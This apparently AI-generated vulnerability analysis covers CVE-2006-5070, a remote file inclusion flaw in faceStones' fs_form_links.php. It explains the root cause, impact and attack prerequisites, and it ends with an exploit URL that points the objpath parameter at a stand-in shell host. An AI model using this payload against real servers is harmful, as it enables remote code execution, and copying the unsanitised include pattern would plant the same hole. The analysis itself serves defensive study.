Based on the provided content, here's an analysis of CVE-2006-5070:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the `fs_form_links.php` file of faceStones personal version 2.0.42 and earlier.
*   The code includes a file based on a user-controlled variable, `$GLOBALS['fsinit']['objpath']`, without proper sanitization.
*   Specifically, the vulnerable code is: `include($GLOBALS['fsinit']['objpath'] . '/fs_display_indextab.php');`

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include a remote file. Because the `objpath` is not sanitized, an attacker can inject a URL pointing to a malicious script.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a remote, attacker-controlled file, the attacker can execute arbitrary PHP code on the server. This can lead to complete system compromise.
*   **Data Breaches:** Attackers can gain access to sensitive information, modify data, and manipulate the application's functionality.

**Attack Vectors:**

*   **HTTP GET Request:** The attack vector is an HTTP GET request to the vulnerable `fs_form_links.php` script.
*   **Manipulating `objpath` parameter:** The attacker appends the `GLOBALS[fsinit][objpath]` parameter to the URL and provides a URL pointing to the malicious script.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker must have network access to the server running faceStones.
*   **Knowledge of the vulnerable script:** The attacker needs to know the location of the `fs_form_links.php` script and how to manipulate the `GLOBALS[fsinit][objpath]` parameter.
*   **Server must allow remote file inclusion:** The vulnerable server must have the configuration option that allows for remote file inclusions.

**Exploit Example**

```
http://sitename.com/[Script Path]/fsl2/objects/fs_form_links.php?GLOBALS[fsinit][objpath]=http://SHELLURL.COM
```

This exploit demonstrates how to inject a malicious URL via the `objpath` parameter. The server will then attempt to include the script found at the `SHELLURL.COM` location.
